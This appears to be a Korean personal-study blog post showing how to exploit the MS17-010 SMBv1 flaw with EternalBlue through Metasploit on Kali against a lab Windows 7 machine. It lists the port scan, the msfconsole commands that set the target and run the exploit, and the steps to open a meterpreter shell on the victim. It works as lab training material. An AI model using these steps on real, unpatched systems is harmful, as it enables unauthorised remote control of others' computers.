---
title:  "[Kali] EternalBlue 사용법"  

categories:
  - Tools
tags:
  - [Kali, Linux, EternalBlue]
date: 2022-09-01
last_modified_at: 2022-09-01
---
## 1️⃣ EternalBlue란?

- 윈도우 시스템의 SMB 프로토콜의 원격코드 실행 취약점(MS17-010, SMBv1)을 이용하여 루트 쉘을 얻는 해킹 도구
- 섀도우 브로커즈 해킹 그룹에 의해 유출된 미 국가안보국의 해킹 도구

<br>

## 2️⃣ 모의해킹 준비물
- 칼리리눅스
- 윈도우7 설치[Window7 순정 iso](https://drive.google.com/file/d/1V42632aqwgiWqif2GoTvjB3i1vviI5tc/view?usp=sharing)

칼리리눅스에 내장되어있는 metasploit를 사용

MS17-010취약점에 대한 보안패치가 이루어지지 않은 윈도우 버전 사용

<br>

## 3️⃣ 공격 시나리오

1. 공격자는 웹서비스 또는 클라이언트 접속 프로그램을 운영 중인 서버에 대해 포트 스캔
2. SMB PORT(445/tcp Microsoft-ds) 열려있는 것을 확인
3. 공격자는 MS17-010 취약점을 이용하여 공격
4. 공격 결과로 서버 루트 계정 쉘 획득 

<br>

## 4️⃣ 취약한 윈도우 환경 세팅
1. 제어판 -> 시스템 및 보안 -> Windows 방화벽 -> Windows 방화벽 설정 또는 해제 
2. 방화벽 설정 모두 해제
![방화벽](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%EB%B0%A9%ED%99%94%EB%B2%BD.PNG)

<br>

## 5️⃣ 모의해킹
윈도우를 취약하게 만들었으니 공격을 해보자

1. 윈도우의 IP주소 확인
- cmd프롬프트 실행 -> ipconfig 입력
![ipconfig](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/ipconfig.PNG)
2. 칼리리눅스에서 포트스캔 진행
![PortScan](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%ED%8F%AC%ED%8A%B8%EC%8A%A4%EC%BA%94.PNG)
445포트에 microsoft-ds가 서비스 중인 것을 확인
3. metasploit을 통해 EternalBlue를 사용해 공격을 진행
- msfconsole에서 eternalblue검색 후 선택
```bash
kali@kali:~$ msfconsole
msf6 > search eternalblue
msf6 > use 0
```
![console1](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%EC%BD%98%EC%86%941.PNG)
- 옵션 설정
```bash
msf6 > show options
msf6 > set RHOSTS 192.168.27.137
```
![console2](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%EC%BD%98%EC%86%942.PNG)
- Exploit
```bash
msf6 > exploit -j
```
![exploit](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/exploit.PNG)
- 확인
```bash
msf6 > sessions
msf6 > sessions 1
meterpreter > cd /
meterpreter > cd Users/minsu/Desktop
meterpreter > mkdir hacking
```
![session1](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/session1.PNG)
![session2](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/session2.PNG)
> 성공!!!!!!!!!!!!

***
<br>

    🌜 개인 공부 기록용 블로그입니다. 오류나 틀린 부분이 있을 경우 
    언제든지 댓글 혹은 메일로 지적해주시면 감사하겠습니다! 😄

[맨 위로 이동하기](#){: .btn .btn--primary }{: .align-right}